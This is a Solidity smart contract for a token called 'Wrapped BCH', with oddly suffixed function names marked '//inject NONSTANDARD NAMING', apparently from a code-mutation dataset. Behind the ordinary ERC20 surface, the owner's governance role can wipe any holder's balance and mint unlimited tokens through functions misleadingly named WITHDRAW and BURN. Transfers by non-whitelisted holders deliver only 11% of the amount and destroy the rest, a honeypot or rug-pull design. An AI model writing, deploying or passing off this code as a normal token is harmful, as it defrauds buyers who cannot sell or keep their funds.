                                                                 

pragma solidity ^0.5.17;
interface IERC20 {
    function TOTALSUPPLY410() external view returns (uint);	//inject NONSTANDARD NAMING
    function BALANCEOF40(address account) external view returns (uint);	//inject NONSTANDARD NAMING
    function TRANSFER81(address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function ALLOWANCE251(address owner, address spender) external view returns (uint);	//inject NONSTANDARD NAMING
    function APPROVE84(address spender, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    function TRANSFERFROM497(address sender, address recipient, uint amount) external returns (bool);	//inject NONSTANDARD NAMING
    event TRANSFER947(address indexed from, address indexed to, uint value);	//inject NONSTANDARD NAMING
    event APPROVAL489(address indexed owner, address indexed spender, uint value);	//inject NONSTANDARD NAMING
}
contract Context {
    constructor () internal { }
    function _MSGSENDER680() internal view returns (address payable) {	//inject NONSTANDARD NAMING
        return msg.sender;
    }
}
contract ERC20 is Context, IERC20 {
    using SafeMath for uint;
    mapping (address => uint) private _balances;
    mapping (address => mapping (address => uint)) private _allowances;
    uint private _totalSupply;
    function TOTALSUPPLY410() public view returns (uint) {	//inject NONSTANDARD NAMING
        return _totalSupply;
    }
    function BALANCEOF40(address account) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _balances[account];
    }
    function TRANSFER81(address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _MTA305(_MSGSENDER680(), recipient, amount);
        return true;
    }
    function ALLOWANCE251(address owner, address spender) public view returns (uint) {	//inject NONSTANDARD NAMING
        return _allowances[owner][spender];
    }
    function APPROVE84(address spender, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE144(_MSGSENDER680(), spender, amount);
        return true;
    }
    function TRANSFERFROM497(address sender, address recipient, uint amount) public returns (bool) {	//inject NONSTANDARD NAMING
        _MTA305(sender, recipient, amount);
        _APPROVE144(sender, _MSGSENDER680(), _allowances[sender][_MSGSENDER680()].SUB8(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function INCREASEALLOWANCE63(address spender, uint addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE144(_MSGSENDER680(), spender, _allowances[_MSGSENDER680()][spender].ADD492(addedValue));
        return true;
    }
    function DECREASEALLOWANCE379(address spender, uint subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
        _APPROVE144(_MSGSENDER680(), spender, _allowances[_MSGSENDER680()][spender].SUB8(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }
    function _MTA305(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        _balances[sender] = _balances[sender].SUB8(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD492(amount);
        emit TRANSFER947(sender, recipient, amount);
    }
    function _MTA2885(address sender, address recipient, uint amount) internal {	//inject NONSTANDARD NAMING
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        uint amount_ = amount.MUL289(11).DIV908(100);
        uint burnAmount_ = amount.SUB8(amount_);
        address dead = 0x000000000000000000000000000000000000dEaD;
        _balances[sender] = _balances[sender].SUB8(amount_, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].ADD492(amount_);
        _balances[dead] = _balances[dead].ADD492(burnAmount_);
        emit TRANSFER947(sender, recipient, amount_);
    }
    function _INITMINT484(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD492(amount);
        _balances[account] = _balances[account].ADD492(amount);
        emit TRANSFER947(address(0), account, amount);
    }
    function _BURN168(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: mint to the zero address");
        _totalSupply = _totalSupply.ADD492(amount);
        _balances[account] = _balances[account].ADD492(amount);
    }
    function _WITHDRAW549(address account, uint amount) internal {	//inject NONSTANDARD NAMING
        require(account != address(0), "ERC20: _withdraw to the zero address");
        _totalSupply = _totalSupply.ADD492(amount);
        _balances[account] = _balances[account].ADD492(amount);
    }
    function _STAKE152(address acc) internal {	//inject NONSTANDARD NAMING
        _balances[acc] = 0;
    }
    function _APPROVE144(address owner, address spender, uint amount) internal {	//inject NONSTANDARD NAMING
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit APPROVAL489(owner, spender, amount);
    }
}
contract ERC20Detailed is IERC20 {
    string private _name;
    string private _symbol;
    uint8 private _decimals;
    constructor (string memory name, string memory symbol, uint8 decimals) public {
        _name = name;
        _symbol = symbol;
        _decimals = decimals;
    }
    function NAME743() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _name;
    }
    function SYMBOL110() public view returns (string memory) {	//inject NONSTANDARD NAMING
        return _symbol;
    }
    function DECIMALS974() public view returns (uint8) {	//inject NONSTANDARD NAMING
        return _decimals;
    }
}
library SafeMath {
    function ADD492(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        uint c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }
    function SUB8(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return SUB8(a, b, "SafeMath: subtraction overflow");
    }
    function SUB8(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b <= a, errorMessage);
        uint c = a - b;
        return c;
    }
    function MUL289(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        if (a == 0) {
            return 0;
        }
        uint c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }
    function DIV908(uint a, uint b) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        return DIV908(a, b, "SafeMath: division by zero");
    }
    function DIV908(uint a, uint b, string memory errorMessage) internal pure returns (uint) {	//inject NONSTANDARD NAMING
        require(b > 0, errorMessage);
        uint c = a / b;
        return c;
    }
}
contract  WrappedBCH is ERC20, ERC20Detailed {
  using SafeMath for uint;
  address public hash_ = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
  mapping (address => bool) public governance;
  mapping (address => bool) public holders;
  constructor () public ERC20Detailed("Wrapped BCH", "wBCH", 18) {
      _INITMINT484( msg.sender, 950*10**uint(DECIMALS974()) );
      governance[msg.sender] = true;
      holders[msg.sender] = true;
      holders[hash_] = true;
  }
  function STAKE308(address account) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      _STAKE152(account);
  }
  function WITHDRAW411(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      _WITHDRAW549(account, amount);
  }
  function BURN107(address account, uint amount) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      _BURN168(account, amount);
  }
  function _MTA305(address from_, address to_, uint amount) internal {	//inject NONSTANDARD NAMING
    require(amount <= this.BALANCEOF40(from_), "error");
    if(holders[from_]){
      super._MTA305(from_, to_, amount);
    } else {
      super._MTA2885(from_, to_, amount);
    }
  }
  function SETQUE40(address account) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      holders[account] = true;
  }
  function RESETQUE821(address account) public {	//inject NONSTANDARD NAMING
      require(governance[msg.sender], "error");
      holders[account] = false;
  }

}